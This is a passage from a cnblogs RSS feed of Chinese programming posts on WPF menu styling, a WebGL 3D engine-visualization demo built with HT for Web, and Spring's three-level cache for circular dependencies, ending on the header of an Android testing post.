                        &amp;lt;Border x:Name=&quot;SubMenuBorder&quot;  BorderThickness=&quot;1&quot; BorderBrush=&quot;Black&quot;&amp;gt;
                            &amp;lt;StackPanel IsItemsHost=&quot;True&quot; KeyboardNavigation.DirectionalNavigation=&quot;Cycle&quot;/&amp;gt;
                        &amp;lt;/Border&amp;gt;
                    &amp;lt;/Popup&amp;gt;
                &amp;lt;/Grid&amp;gt;
            &amp;lt;/ControlTemplate&amp;gt;
        &amp;lt;/Setter.Value&amp;gt;
    &amp;lt;/Setter&amp;gt;
&amp;lt;/Style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;控件&lt;code&gt;Popup&lt;/code&gt;用于展示子级菜单项。其中&lt;code&gt;StackPanel&lt;/code&gt;上的&lt;code&gt;IsItemsHost=&quot;True&quot;&lt;/code&gt;保证正确处理子级。&lt;/p&gt;
&lt;p&gt;名为&lt;strong&gt;MoreLbl&lt;/strong&gt;的Label控件用于提示是否有子级。这里简略用&amp;gt;&amp;gt;标识一下，读者可以图片Image或者Path控件做一个漂亮的样式。&lt;/p&gt;
&lt;p&gt;最终效果如下,一级和次级依然不统一。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1214143/202003/1214143-20200319001413767-714082713.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;为了统一，我们需要对Menu的样式加以调整。最简单的方式是对子项承载容器进行替换，我们用&lt;code&gt;StackPanel&lt;/code&gt;控件，并把内容排序设置为垂直方向即可。&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Menu ItemsSource=&quot;{Binding MenuTreeSource}&quot; HorizontalAlignment=&quot;Center&quot;&amp;gt;
    &amp;lt;Menu.ItemsPanel&amp;gt;
        &amp;lt;ItemsPanelTemplate&amp;gt;
            &amp;lt;StackPanel Orientation=&quot;Vertical&quot;&amp;gt;&amp;lt;/StackPanel&amp;gt;
        &amp;lt;/ItemsPanelTemplate&amp;gt;
    &amp;lt;/Menu.ItemsPanel&amp;gt;
    &amp;lt;Menu.ItemTemplate&amp;gt;
        &amp;lt;HierarchicalDataTemplate ItemsSource=&quot;{Binding Children}&quot;&amp;gt;&amp;lt;/HierarchicalDataTemplate&amp;gt;
    &amp;lt;/Menu.ItemTemplate&amp;gt;
&amp;lt;/Menu&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最终效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1214143/202003/1214143-20200319001453534-994990934.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;ContextMenu与Menu不同，他可以作为很多控件的Popup形式的鼠标右键弹出菜单，比如作为ListBox，Label，Grid等的内容菜单都是可以的，我们只需鼠标右键就可以将其弹出。&lt;/p&gt;
&lt;p&gt;我们用&lt;code&gt;Label&lt;/code&gt;简单举例：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Label Content=&quot;鼠标右键弹出ContextMenu&quot; HorizontalAlignment=&quot;Center&quot;HorizontalContentAlignment=&quot;Center&quot; FontSize=&quot;25&quot; Background=&quot;#221a12&quot;Foreground=&quot;#b8d00a&quot;
     MouseDown=&quot;Label_MouseDown&quot;&amp;gt;
    &amp;lt;Label.ContextMenu&amp;gt;
        &amp;lt;ContextMenu ItemsSource=&quot;{Binding MenuTreeSource}&quot;&amp;gt;
            &amp;lt;ContextMenu.ItemTemplate&amp;gt;
                &amp;lt;HierarchicalDataTemplate ItemsSource=&quot;{Binding Children}&quot; /&amp;gt;
            &amp;lt;/ContextMenu.ItemTemplate&amp;gt;
        &amp;lt;/ContextMenu&amp;gt;
    &amp;lt;/Label.ContextMenu&amp;gt;
&amp;lt;/Label&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;之前的样式都是全局样式，默认会自动使用。效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1214143/202003/1214143-20200319001801732-925992799.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;能够发现一级的样式稍微有些不一样，我们需要改&lt;code&gt;ContextMenu&lt;/code&gt;的样式&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Style TargetType=&quot;{x:Type ContextMenu}&quot;&amp;gt;
    &amp;lt;Setter Property=&quot;SnapsToDevicePixels&quot; Value=&quot;True&quot;/&amp;gt;
    &amp;lt;Setter Property=&quot;OverridesDefaultStyle&quot; Value=&quot;True&quot;/&amp;gt;
    &amp;lt;Setter Property=&quot;Grid.IsSharedSizeScope&quot; Value=&quot;true&quot;/&amp;gt;
    &amp;lt;Setter Property=&quot;Template&quot;&amp;gt;
        &amp;lt;Setter.Value&amp;gt;
            &amp;lt;ControlTemplate TargetType=&quot;{x:Type ContextMenu}&quot;&amp;gt;
                &amp;lt;Border 
                    BorderBrush=&quot;Black&quot;
                    BorderThickness=&quot;1&quot; &amp;gt;
                    &amp;lt;StackPanel IsItemsHost=&quot;True&quot; KeyboardNavigation.DirectionalNavigation=&quot;Cycle&quot;/&amp;gt;
                &amp;lt;/Border&amp;gt;
            &amp;lt;/ControlTemplate&amp;gt;
        &amp;lt;/Setter.Value&amp;gt;
    &amp;lt;/Setter&amp;gt;
&amp;lt;/Style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;简单重写Template即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1214143/202003/1214143-20200319001640393-686642984.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;这里只简单介绍如何去重写样式模板来改变菜单展示效果。具体使用中大家需要更好看的效果请自行设计。该wpf项目框架使用dotnet core3.1版本。在farmwork中应该一样。&lt;/p&gt;
</description>
<pubDate>Wed, 18 Mar 2020 16:19:00 +0000</pubDate>
<dc:creator>麦比乌斯皇</dc:creator>
<og:description>wpf menu style and binding treedat</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/hsxian/p/12521501.html</dc:identifier>
</item>
<item>
<title>基于 HTML5 WebGL  的发动机 3D 可视化系统 - xhload3d</title>
<link>http://www.cnblogs.com/xhload3d/p/12520693.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xhload3d/p/12520693.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;    工业机械产品大多体积庞大、运输成本高，在参加行业展会或向海外客户销售时，如果没有实物展示，仅凭静态、简单的图片说明书介绍，无法让客户全面了解产品，不仅工作人员制作麻烦，客户看得也费力。如果能在 Web 上做 3D 设备展示，销售人员可以不限平台随时给客户介绍演示。还可以不受现实条件限制，演示设备拆分和组装的过程，展示产品内部结构和动态运作时的效果，让客户更直观了解产品的部件组成，更准确、全面地了解产品的功能和特点，大大降低了沟通成本。为了解决这些行业痛点，本篇文章采用 &lt;a href=&quot;http://www.hightopo.com/&quot;&gt;Hightopo&lt;/a&gt; 的 HT for Web 产品实现了一个发动机设备 3D 可视化案例。&lt;/p&gt;
&lt;h2 id=&quot;系统预览&quot;&gt;系统预览&lt;/h2&gt;
&lt;p&gt;预览地址：基于 HTML5 WebGL  的发动机 3D 可视化系统（&lt;a href=&quot;http://www.hightopo.com/demo/engine/&quot; class=&quot;uri&quot;&gt;http://www.hightopo.com/demo/engine/&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200205161952589-658210919.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;场景搭建&quot;&gt;场景搭建&lt;/h2&gt;
&lt;p&gt;发动机模型是设计师通过 3ds Max 建模，然后导出 obj 与 mtl 文件，在 HT 中解析 obj 与 mtl 文件生成 3D 场景中可用的模型（可参考 obj 手册《&lt;a href=&quot;https://www.hightopo.com/guide2/ht/guide/plugin/obj/ht-obj-guide.html#ref_loadbyjson&quot;&gt;通过JSON加载&lt;/a&gt;》章节），因为各个部件需要单独操作，所以设备模型拆分为多个 obj 文件后导入。&lt;/p&gt;
&lt;p&gt;2D 面板部分则是通过 HT 的矢量绘制，我们需要创建 ht.graph.GraphView 和 ht.graph3d.Graph3dView 来呈现 2D 和 3D 的内容。相关代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var g2d = new ht.graph.GraphView();
var g3d = new ht.graph3d.Graph3dView();
// 将 3D 组件加入到 body 下
g3d.addToDOM();
// 将 2D 组件加入到 3D 组件的根 div 下
g2d.addToDOM(g3d.getView());&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;功能实现&quot;&gt;功能实现&lt;/h2&gt;
&lt;h3 id=&quot;设备拆解动画&quot;&gt;设备拆解动画&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200205152209644-1047564759.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当我们点击“展开”按钮时，给各个动画设置不同的延迟，使动画错开执行，以达到更好的视觉效果，让2D图纸和3D场景更好地联动起来。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200221052437402-84998407.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果我们的每个动画都匀速运行，那看起来难免有些单调。于是我给不同动画加上了不同的 Easing 函数，Easing 函数通过定义不同曲线的数据公式方式，来描述每一帧回调时需要改变图形参数属性的幅度，从而达到均匀、先快后慢、先慢后快，甚至先超出起始值和结束值再慢慢恢复的各种动画特效。这里还有个例子可以帮助我们更直观的感受不同 Easing 函数的效果：《&lt;a href=&quot;http://www.hightopo.com/guide/guide/plugin/form/examples/example_easing.html&quot;&gt;From Easing&lt;/a&gt;》。&lt;/p&gt;
&lt;p&gt;例如图纸中心的跟随部件拆解旋转放大的圆环，我给它设置了 Easing.backBoth 缓动效果，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 圆环动画
animCenter(data) {
    ht.Default.startAnim({
        duration: 4500,
        // 设置缓动函数
        easing: Easing.backBoth,
        // 延迟一秒执行动画
        delay: 1000,
        action: function (v, t) {
            // 修改图元缩放值
            data.setScale(1 + v * 0.9, 1 + v * 0.9);
            // 修改图元旋转角度
            data.setRotation(Math.PI * v);
        },
    });
}

// 缓动函数
Easing.easeOutStrong = function (t) {
    var BACK_CONST = 1.70158;
    if ((t *= 2) &amp;lt; 1) {
        return .5 * (t * t * (((BACK_CONST *= (1.525)) + 1) * t - BACK_CONST));
    }
    return .5 * ((t -= 2) * t * (((BACK_CONST *= (1.525)) + 1) * t + BACK_CONST) + 2);
};&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;设备部件的拆解动画，是通过改变节点的坐标和旋转角度来实现的，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// targetP3 为拆解后的坐标，p3为当前坐标
var p3 = node.p3();
var offset = [targetP3[0] - p3[0], targetP3[1] - p3[1], targetP3[2] - p3[2]];

// targetR3 为拆解后的旋转角度，r3为当前旋转角度
var r3 = node.r3();
var offset = [targetR3[0] - r3[0], targetR3[1] - r3[1], targetR3[2] - r3[2]];

// 拆解动画
ht.Default.startAnim({
    duration: 2000,
    // 设置缓动函数
    easing: Easing.easeOutStrong,
    delay: 1000,
    action: function (v, t) {
        // 修改节点坐标
        node.p3(p3[0] + offset[0] * v, p3[1] + offset[1] * v, p3[2] + offset[2] * v);
        // 修改节点旋转角度
        node.r3(r3[0] + offset[0] * v, r3[1] + offset[1] * v, r3[2] + offset[2] * v);
    },
});

// 缓动函数
Easing.easeOutStrong = function (t) {
    return 1 - (--t) * t * t * t;
};&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;还有图纸两侧的面板，可以通过设置它的裁剪方向和裁剪比例实现隐藏效果，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 设置图元裁剪方向为从右到左
node.s('clip.direction', 'left');

// 裁剪动画
ht.Default.startAnim({
    duration: 1800,
    easing: Easing.easeOutStrong,
    action: function (v, t) {
        // 修改图元裁剪比例
        node.s('clip.percentage', 1 - v);
    }
});

// 缓动函数
Easing.easeOutStrong = function (t) {
    return 1 - (--t) * t * t * t;
};&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;设备内部运作动画&quot;&gt;设备内部运作动画&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200205152223059-1337515892.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们实现视角变化动画来观察设备不同部件构造，3D 场景中的视角是由 Graph3dView 提供的 center（目标点坐标）和 eye（摄像机坐标）两个参数决定的，所以视角动画只要动态改变这两个参数，这里用了 HT 提供的 moveCamera 方法实现，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;g3d.moveCamera([-466, 93, -280], [40, -40, -40], {
    duration: 2500,
    easing: function (t) {
        return 1 - (--t) * t * t * t;
    },
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;设备中一些小的部件吸附在大部件上，会跟随大部件移动旋转。比如这个液压杆，当我们要实现小部件的运动动画时，如果用修改坐标的方式计算起来比较麻烦，所以我们用修改锚点的方式来实现，锚点影响着节点的位置，锚点也是旋转和缩放的中心点。这里通过修改液压杆的 Y 轴锚点实现动画，效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200206093704702-2052459593.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;相关代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ht.Default.startAnim({
        duration: 800,
        action: function (v, t) {
            // 修改节点 Y 轴锚点
            node.setAnchor3d(0.5,v,0.5);
        },
};&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200205152225586-1041941507.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击流动按钮后，我们可以看到管道内有液体流动的动画。要实现流动效果，首先我们需要一张二方连续贴图（左右或上下可以无缝衔接的贴图），然后我们再通过代码驱动 UV 向 U 轴的正值方向偏移一个象限，并无限循环这一动作，效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200221074910737-957874087.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ht.Default.startAnim({
    duration: 2000,
    action: function (v, t) {
        // 修改贴图uv值
        node.s('shape3d.uv.offset', [v, 0]);
    },
};&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;设备复原动画&quot;&gt;设备复原动画&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200205152234946-7762164.gif&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;鼠标移入效果&quot;&gt;鼠标移入效果&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1496396/202002/1496396-20200206201211295-2098159884.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;为了能透过外壳清楚的观察到设备内部结构，所以当鼠标悬停在部件上时，我调整了外壳模型透明度并设置模型高亮模式，相关代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 设置高亮颜色
ht.Style['highlight.color'] = 'rgba(255,255,255,0.6)';
// 设置当前高亮的模式
g3d.setHighlightMode('mouseover');
// 节点启用高亮效果
data.s('highlight.visible', true);

// 节点设置为可交互
data.s('interactive', true);
// 节点开启交互后，不阻止场景上默认的交互行为
data.s('preventDefaultWhenInteractive', false);

// 监听交互事件
g3d.mi(function (e) {
    // 鼠标移入事件
    if (e.kind === 'onEnter') {
        // 节点开启透明
        data.s('shape3d.transparent', true);
        // 设置节点透明度
        data.s('shape3d.opacity', 0.25);
    }

    // 鼠标移出事件
    if (e.kind === 'onLeave') {
        data.s('shape3d.transparent', false);
    }
});&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;场景视角限制&quot;&gt;场景视角限制&lt;/h3&gt;
&lt;p&gt;最后，我们再对整个场景的视角范围做下限制，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 设置最大角度
ht.Default.graph3dViewMaxPhi = Math.PI / 2;
// 设置最小角度
ht.Default.graph3dViewMinPhi = Math.PI / 4;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;    通过案例我们可以感受到，相较于传统方式，设备的三维展示具有更灵活的表现形式和更直观生动的效果，对于出口型企业，生动的演示动画能让外商更快了解产品的工作原理和优势，还能避免因语言误差而造成误解。而且比起普通的工业动画，Web 上的可视化系统展示内容更丰富、自由度更高，后续需求更改也更为灵活、成本更低。&lt;/p&gt;
&lt;p&gt;    本文使用的设备模型是设计师虚构的核动力发动机，更注重于模型的展示效果，如果应用于实际产品中，还可以制作更还原实际的设备拆解流程，通过线上的 3D 产品操作演练，对工作人员进行产品组装、拆分、维修培训。有兴趣可以参考我们另一个案例《&lt;a href=&quot;https://www.cnblogs.com/htdaydayup/p/12159507.html&quot;&gt;基于 HTML5 WebGL + WebVR 的 3D 虚拟现实可视化培训系统&lt;/a&gt;》。&lt;/p&gt;
</description>
<pubDate>Wed, 18 Mar 2020 16:01:00 +0000</pubDate>
<dc:creator>xhload3d</dc:creator>
<og:description>前言 工业机械产品大多体积庞大、运输成本高，在参加行业展会或向海外客户销售时，如果没有实物展示，仅凭静态、简单的图片说明书介绍，无法让客户全面了解产品，不仅工作人员制作麻烦，客户看得也费力。如果能在</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xhload3d/p/12520693.html</dc:identifier>
</item>
<item>
<title>Spring解决循环依赖，你真的懂了吗？ - 爱撒谎的男孩</title>
<link>http://www.cnblogs.com/Chenjiabing/p/12521178.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Chenjiabing/p/12521178.html</guid>
<description>&lt;h2 id=&quot;导读&quot;&gt;导读&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/chenjiabing666/Blog-file/raw/master/circleex.png&quot; alt=&quot;微信所有码猿技术专栏&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;这个就是典型的构造器依赖，详情请看上面两篇文章，这里不再详细赘述了。本篇文章将会从源码深入解析Spring是如何解决循环依赖的？为什么不能解决构造器的循环依赖？&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;什么是循环依赖&quot;&gt;什么是循环依赖&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;简单的说就是A依赖B，B依赖C，C依赖A这样就构成了循环依赖。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/chenjiabing666/Blog-file/raw/master/15282870029143.jpg&quot; alt=&quot;微信搜索码猿技术专栏&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;循环依赖分为构造器依赖和属性依赖，众所周知的是Spring能够解决属性的循环依赖（set注入）。下文将从源码角度分析Spring是如何解决属性的循环依赖。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;思路&quot;&gt;思路&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;如何解决循环依赖，Spring主要的思路就是依据三级缓存，在实例化A时调用doGetBean，发现A依赖的B的实例，此时调用doGetBean去实例B，实例化的B的时候发现又依赖A，如果不解决这个循环依赖的话此时的doGetBean将会无限循环下去，导致内存溢出，程序奔溃。spring引用了一个早期对象，并且把这个&quot;早期引用&quot;并将其注入到容器中，让B先完成实例化，此时A就获取B的引用，完成实例化。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;三级缓存&quot;&gt;三级缓存&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Spring能够轻松的解决属性的循环依赖正式用到了三级缓存，在AbstractBeanFactory中有详细的注释。&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    /**一级缓存，用于存放完全初始化好的 bean，从该缓存中取出的 bean 可以直接使用*/
    private final Map&amp;lt;String, Object&amp;gt; singletonObjects = new ConcurrentHashMap&amp;lt;&amp;gt;(256);

    /**三级缓存 存放 bean 工厂对象，用于解决循环依赖*/
    private final Map&amp;lt;String, ObjectFactory&amp;lt;?&amp;gt;&amp;gt; singletonFactories = new HashMap&amp;lt;&amp;gt;(16);

    /**二级缓存 存放原始的 bean 对象（尚未填充属性），用于解决循环依赖*/
    private final Map&amp;lt;String, Object&amp;gt; earlySingletonObjects = new HashMap&amp;lt;&amp;gt;(16);&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;一级缓存：singletonObjects，存放完全实例化属性赋值完成的Bean，直接可以使用。&lt;/li&gt;
&lt;li&gt;二级缓存：earlySingletonObjects，存放早期Bean的引用，尚未属性装配的Bean&lt;/li&gt;
&lt;li&gt;三级缓存：singletonFactories，三级缓存，存放实例化完成的Bean工厂。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;开撸&quot;&gt;开撸&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;先上一张流程图看看Spring是如何解决循环依赖的&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/chenjiabing666/Blog-file/raw/master/spring-fix-cirdependence.png&quot; alt=&quot;微信搜索码猿技术专栏&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;上图标记蓝色的部分都是涉及到三级缓存的操作，下面我们一个一个方法解析&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;【1】 getSingleton(beanName)：源码如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;        //查询缓存
        Object sharedInstance = getSingleton(beanName);
        //缓存中存在并且args是null
        if (sharedInstance != null &amp;amp;&amp;amp; args == null) {
            //.......省略部分代码
            
            //直接获取Bean实例
            bean = getObjectForBeanInstance(sharedInstance, name, beanName, null);
        }
        
    //getSingleton源码，DefaultSingletonBeanRegistry#getSingleton
protected Object getSingleton(String beanName, boolean allowEarlyReference) {
        //先从一级缓存中获取已经实例化属性赋值完成的Bean
        Object singletonObject = this.singletonObjects.get(beanName);
        //一级缓存不存在，并且Bean正处于创建的过程中
        if (singletonObject == null &amp;amp;&amp;amp; isSingletonCurrentlyInCreation(beanName)) {
            synchronized (this.singletonObjects) {
                //从二级缓存中查询，获取Bean的早期引用，实例化完成但是未赋值完成的Bean
                singletonObject = this.earlySingletonObjects.get(beanName);
                //二级缓存中不存在，并且允许创建早期引用（二级缓存中添加）
                if (singletonObject == null &amp;amp;&amp;amp; allowEarlyReference) {
                    //从三级缓存中查询，实例化完成，属性未装配完成
                    ObjectFactory&amp;lt;?&amp;gt; singletonFactory = this.singletonFactories.get(beanName);
                    if (singletonFactory != null) {
                        singletonObject = singletonFactory.getObject();
                            //二级缓存中添加
                        this.earlySingletonObjects.put(beanName, singletonObject);
                        //从三级缓存中移除
                        this.singletonFactories.remove(beanName);
                    }
                }
            }
        }
        return singletonObject;
    }
        

&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;从源码可以得知，doGetBean最初是查询缓存，一二三级缓存全部查询，如果三级缓存存在则将Bean早期引用存放在二级缓存中并移除三级缓存。（升级为二级缓存）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;【2】addSingletonFactory：源码如下&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;
        //中间省略部分代码。。。。。
        //创建Bean的源码，在AbstractAutowireCapableBeanFactory#doCreateBean方法中
        if (instanceWrapper == null) {
            //实例化Bean
            instanceWrapper = createBeanInstance(beanName, mbd, args);
        }
        //允许提前暴露
        if (earlySingletonExposure) {
            //添加到三级缓存中
            addSingletonFactory(beanName, () -&amp;gt; getEarlyBeanReference(beanName, mbd, bean));
        }
        try {
            //属性装配，属性赋值的时候，如果有发现属性引用了另外一个Bean，则调用getBean方法
            populateBean(beanName, mbd, instanceWrapper);
            //初始化Bean，调用init-method，afterproperties方法等操作
            exposedObject = initializeBean(beanName, exposedObject, mbd);
        }
        }

//添加到三级缓存的源码，在DefaultSingletonBeanRegistry#addSingletonFactory
protected void addSingletonFactory(String beanName, ObjectFactory&amp;lt;?&amp;gt; singletonFactory) {
        synchronized (this.singletonObjects) {
            //一级缓存中不存在
            if (!this.singletonObjects.containsKey(beanName)) {
                //放入三级缓存
                this.singletonFactories.put(beanName, singletonFactory);
                //从二级缓存中移除，
                this.earlySingletonObjects.remove(beanName);
                this.registeredSingletons.add(beanName);
            }
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;从源码得知，Bean在实例化完成之后会直接将未装配的Bean工厂存放在&lt;strong&gt;三级缓存&lt;/strong&gt;中，并且&lt;strong&gt;移除二级缓存&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;【3】addSingleton：源码如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//获取单例对象的方法，DefaultSingletonBeanRegistry#getSingleton
//调用createBean实例化Bean
singletonObject = singletonFactory.getObject();

//。。。。中间省略部分代码  

//doCreateBean之后才调用，实例化，属性赋值完成的Bean装入一级缓存，可以直接使用的Bean
addSingleton(beanName, singletonObject);

//addSingleton源码，在DefaultSingletonBeanRegistry#addSingleton方法中
protected void addSingleton(String beanName, Object singletonObject) {
        synchronized (this.singletonObjects) {
            //一级缓存中添加
            this.singletonObjects.put(beanName, singletonObject);
            //移除三级缓存
            this.singletonFactories.remove(beanName);
            //移除二级缓存
            this.earlySingletonObjects.remove(beanName);
            this.registeredSingletons.add(beanName);
        }
    }


                &lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;总之一句话，Bean添加到一级缓存，移除二三级缓存。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;扩展&quot;&gt;扩展&lt;/h2&gt;
&lt;p&gt;【1】为什么Spring不能解决构造器的循环依赖？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;从流程图应该不难看出来，在Bean调用构造器实例化之前，一二三级缓存并没有Bean的任何相关信息，在实例化之后才放入三级缓存中，因此当getBean的时候缓存并没有命中，这样就抛出了循环依赖的异常了。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;【2】为什么多实例Bean不能解决循环依赖？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;多实例Bean是每次创建都会调用doGetBean方法，根本没有使用一二三级缓存，肯定不能解决循环依赖。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;根据以上的分析，大概清楚了Spring是如何解决循环依赖的。假设A依赖B，B依赖A（注意：这里是set属性依赖）分以下步骤执行：&lt;/li&gt;
&lt;/ul&gt;&lt;ol&gt;&lt;li&gt;A依次执行&lt;strong&gt;doGetBean&lt;/strong&gt;、查询缓存、&lt;strong&gt;createBean&lt;/strong&gt;创建实例，实例化完成放入三级缓存singletonFactories中，接着执行&lt;strong&gt;populateBean&lt;/strong&gt;方法装配属性，但是发现有一个属性是B的对象。&lt;/li&gt;
&lt;li&gt;因此再次调用doGetBean方法创建B的实例，依次执行doGetBean、查询缓存、createBean创建实例，实例化完成之后放入三级缓存singletonFactories中，执行populateBean装配属性，但是此时发现有一个属性是A对象。&lt;/li&gt;
&lt;li&gt;因此再次调用doGetBean创建A的实例，但是执行到getSingleton查询缓存的时候，从三级缓存中查询到了A的实例(早期引用，未完成属性装配)，此时直接返回A，不用执行后续的流程创建A了，那么B就完成了属性装配，此时是一个完整的对象放入到一级缓存singletonObjects中。&lt;/li&gt;
&lt;li&gt;B创建完成了，则A自然完成了属性装配，也创建完成放入了一级缓存singletonObjects中。&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;Spring三级缓存的应用完美的解决了循环依赖的问题，下面是循环依赖的解决流程图。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/chenjiabing666/Blog-file/raw/master/cirdependece.PNG&quot; alt=&quot;微信搜索码猿技术专栏&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果觉得作者写的好，有所收获的话，点个关注推荐一下哟！！！&lt;br/&gt;&lt;img src=&quot;https://gitee.com/chenjiabing666/Blog-file/raw/master/wechat.png&quot; alt=&quot;微信搜索公众号码猿技术专栏&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Wed, 18 Mar 2020 15:15:00 +0000</pubDate>
<dc:creator>爱撒谎的男孩</dc:creator>
<og:description>Spring解决循环依赖，你真的懂了吗？</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Chenjiabing/p/12521178.html</dc:identifier>
</item>
<item>
<title>记Android R（SDK=30）系统执行UiAutomator1.0异常 - walker-world</title>
<link>http://www.cnblogs.com/walker-world/p/12521155.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/walker-world/p/12521155.html</guid>
